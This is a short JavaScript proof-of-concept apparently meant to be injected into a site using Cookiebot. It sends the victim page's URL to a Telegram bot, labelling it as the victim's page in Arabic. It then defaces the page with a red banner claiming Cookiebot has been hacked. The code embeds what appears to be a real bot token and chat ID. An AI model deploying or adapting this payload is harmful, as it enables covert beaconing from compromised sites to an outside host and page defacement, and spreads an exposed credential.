// 🔥 Telegram Alert PoC

fetch("https://api.telegram.org/bot<7418874172:AAFy2mvuxosCEGJEKUls4EoXaSIcjfJ82Ac>/sendMessage", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    chat_id: "<6929699769>",
    text: "🚨 تم تحميل السكربت على الضحية: " + location.href
  })
});

// إضافة استغلال واضح
document.body.innerHTML += "<h1 style='color:red'>🔥 Cookiebot تم اختراقه</h1>";
